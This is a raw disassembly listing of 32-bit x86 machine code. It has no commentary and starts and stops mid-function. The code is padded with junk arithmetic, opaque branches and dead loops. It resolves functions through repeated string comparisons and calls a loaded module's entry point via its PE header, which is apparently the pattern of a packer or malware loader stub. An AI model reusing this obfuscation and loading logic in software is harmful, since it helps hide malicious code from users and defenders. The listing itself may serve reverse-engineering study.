  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af51
  41c85f:	mov    eax,ds:0x42af5d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c81
  41d28a:	mov    ecx,DWORD PTR ds:0x429d45
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
